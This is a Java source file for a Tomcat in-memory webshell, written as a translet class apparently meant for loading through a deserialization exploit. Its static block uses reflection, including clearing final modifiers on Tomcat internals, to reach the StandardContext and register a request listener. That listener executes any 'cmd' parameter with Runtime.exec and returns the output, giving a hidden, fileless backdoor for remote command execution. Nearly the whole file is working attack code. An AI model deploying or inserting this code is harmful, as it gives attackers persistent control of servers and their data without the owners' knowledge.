package org.example.tomcatmemshell.Listener;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.Context;
import org.apache.catalina.WebResourceRoot;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.RequestFacade;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.ApplicationContextFacade;
import org.apache.catalina.core.ApplicationFilterChain;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;
import org.example.tomcatmemshell.Filter.FilterMemShell;

import javax.servlet.*;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;

public class ListenerMemShell extends AbstractTranslet implements ServletRequestListener {
    static {
        try {
            //获取StandardContext
//            StandardContext standardContext = getStandardContext1();
            StandardContext standardContext = getStandardContext2();
            if(standardContext != null){
                standardContext.addApplicationEventListener(new ListenerMemShell());
            }
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
    @Override
    public void requestDestroyed(ServletRequestEvent sre) {}

    /**
     * Receives notification that a ServletRequest is about to come
     * into scope of the web application.
     *
     * @param sre the ServletRequestEvent containing the ServletRequest
     * and the ServletContext representing the web application
     *
     * @implSpec
     * The default implementation takes no action.
     */
    @Override
    public void requestInitialized(ServletRequestEvent sre) {
        System.out.println(
                "TomcatShellInject Listener requestInitialized.....................................................................");
        String cmdParamName = "cmd";
        String cmd;
        try {
            RequestFacade servletRequest = (RequestFacade) sre.getServletRequest();
            Field requestFacade = RequestFacade.class.getDeclaredField("request");
            requestFacade.setAccessible(true);
            Request request = (Request) requestFacade.get(servletRequest);
            ServletResponse servletResponse = request.getResponse();
            if ((cmd = servletRequest.getParameter(cmdParamName)) != null) {
                Process process = Runtime.getRuntime().exec(cmd);
                java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                        new java.io.InputStreamReader(process.getInputStream()));
                StringBuilder stringBuilder = new StringBuilder();
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    stringBuilder.append(line + '\n');
                }
                servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
                servletResponse.getOutputStream().flush();
                servletResponse.getOutputStream().close();
                return;
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }
    public static StandardContext getStandardContext1() {
        try{
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            Field webappclassLoaderBaseField=Class.forName("org.apache.catalina.loader.WebappClassLoaderBase").getDeclaredField("resources");
            webappclassLoaderBaseField.setAccessible(true);
            WebResourceRoot resources=(WebResourceRoot) webappclassLoaderBaseField.get(webappClassLoaderBase);
            Context StandardContext =  resources.getContext();
            return (StandardContext) StandardContext;
        } catch (NoSuchFieldException e) {
            throw new RuntimeException(e);
        } catch (ClassNotFoundException e) {
            throw new RuntimeException(e);
        } catch (IllegalAccessException e) {
            throw new RuntimeException(e);
        }
    }

    public static StandardContext getStandardContext2() {
        try{
            //反射获取WRAP_SOME_OBJECT_FIELD lastServicedRequest lastServicedResponse
            Field WRAP_SOME_OBJECT_FIELD=Class.forName("org.apache.catalina.core.ApplicationDispatcher").getDeclaredField("WRAP_SAME_OBJECT");
            Field lastServicedRequestfield= ApplicationFilterChain.class.getDeclaredField("lastServicedRequest");
            Field lastServicedResponsefield=ApplicationFilterChain.class.getDeclaredField("lastServicedResponse");
            WRAP_SOME_OBJECT_FIELD.setAccessible(true);
            lastServicedRequestfield.setAccessible(true);
            lastServicedResponsefield.setAccessible(true);
            //使用modifiersField修改属性值的final修饰
            //每一个Field都会存在一个变量 modifiers用来描述修饰词，所以这里我们获取到的是Field的modifiers 它本质上是一个int类型的值
            java.lang.reflect.Field  modifiersfield= Field.class.getDeclaredField("modifiers");
            modifiersfield.setAccessible(true);

            //修改WRAP_SOME_OBJECT_FIELD以及requst和response的modifiers，值的话由于要得到16进制位数，并且清除final属性，本质上就是将他修改为0x0000即可，这里getModifiers()的结果为0x0010 Modifier.FINAL的结果也是0x0010，所以两者&~运算得到0x0000
            modifiersfield.setInt(WRAP_SOME_OBJECT_FIELD,WRAP_SOME_OBJECT_FIELD.getModifiers() & ~Modifier.FINAL);
            modifiersfield.setInt(lastServicedRequestfield,lastServicedRequestfield.getModifiers() & ~Modifier.FINAL);
            modifiersfield.setInt(lastServicedResponsefield,lastServicedResponsefield.getModifiers() & ~Modifier.FINAL);


            //如果是第一次访问，WRAP_SOME_OBJECT_FIELD肯定是没有值的，所以我们赋值上true 并且同时给lastServicedRequest和lastServicedResponse都初始化
            if(!WRAP_SOME_OBJECT_FIELD.getBoolean(null)){
                WRAP_SOME_OBJECT_FIELD.setBoolean(null,true);
                lastServicedResponsefield.set(null,new ThreadLocal<ServletResponse>());
                lastServicedRequestfield.set(null,new ThreadLocal<ServletRequest>());
                return null;

            }else{//第二次访问开始正式获取当前线程下的Req和Resp
                ThreadLocal<ServletRequest> threadLocalReq= (ThreadLocal<ServletRequest>)lastServicedRequestfield.get(null);
                ThreadLocal<ServletResponse> threadLocalResp=(ThreadLocal<ServletResponse>) lastServicedResponsefield.get(null);
                ServletRequest servletRequest = threadLocalReq.get();//servletRequest:RequestFacade
                ServletResponse servletResponse = threadLocalResp.get();

                ApplicationContextFacade applicationContextFacade = (ApplicationContextFacade) servletRequest.getServletContext();
                Field applicationContextFacadeField = applicationContextFacade.getClass().getDeclaredField("context");
                applicationContextFacadeField.setAccessible(true);
                ApplicationContext applicationContext = (ApplicationContext) applicationContextFacadeField.get(applicationContextFacade);
                Field standardContextField = applicationContext.getClass().getDeclaredField("context");
                standardContextField.setAccessible(true);
                StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);

                System.out.println(servletRequest);
                return standardContext;
            }

        }
        catch (Exception e){
            e.printStackTrace();
        }
        return null;
    }
}
